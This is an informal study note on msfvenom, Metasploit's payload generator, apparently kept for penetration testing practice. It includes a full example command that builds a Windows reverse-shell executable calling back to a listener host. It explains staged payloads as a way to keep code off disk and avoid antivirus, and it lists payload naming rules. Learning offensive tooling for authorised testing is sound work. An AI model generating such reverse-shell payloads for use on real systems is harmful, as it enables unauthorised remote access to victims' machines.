MSFVENOM

Generate payloads in .exe, .aspx, .war, .py and other formats.

standard syntax:
msfvenom -p <PAYLOAD> <OPTIONS>

example, a windows x64 reverse shell in an exe format:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-OP> LPORT=<listen-port>

option			description
-f <format>		Specifies thxe output format
-o <file>		The output location and filename for the generated payload
LHOST=<IP>		The ip to connect back to
LPORT=<port>		The port on the local machine to connect back to (0-65535)

staged vs stageless:
staged payloads - are sent in two parts. The first part is the stager. A piece of code which
executed directly on the server itslef. It connects back to a waiting listener, but doesn't
contain any reverse shell code itself. Intead it conencts to the listener and uses the connection
to load the real payload, executing it directly and preventing it from touching the disk where
it could be caught by traditional anti-virus solutions.Thus the payload is sploit into two parts.
A small initial stager, then the bulkier reverse shell code which is downloadable when the stager
is activated. Staged payloads require a special lsitener -- usually a metasploit multi/handler

stageless - more common payload. Entirely self-contained in that there is one pice of code which,
when executed, sends a shell back immediately to the waiting listener

Meterpreter:
metasploit's brand of fully-featured shell. completely stable, and very good when working with
windows targets. 

Payload naming conventions:
The basic convention is: <OS>/<arch>/<payload>
for example:
linux/x86/shell_reverse_tcp
This would generate a stageless reverse shell for an x86 Linux target
The exception is for windows 32bit targets. The arch is not specified:
windows/shell_reverse-tcp
For 64bit Windows targets the arch would be specified (x64)
Stageless payloads are denoted by underscores '_'
ex:
shell_reverse_tcp
Staged payloads are denoted with a forward slash '/'
shell/reverse_tcp
**This rule also applies to Meterpreter payloads:
windows/x64/meterpreter/reverse_tcp
Linux 32bit stageless Meterpreter payload:
linux/x86/meterpreter_reverse_tcp


msfvenom --list payloads
can be piped into grep
msfvenom --list payloads | grep 'linux/x86/meterpreter'
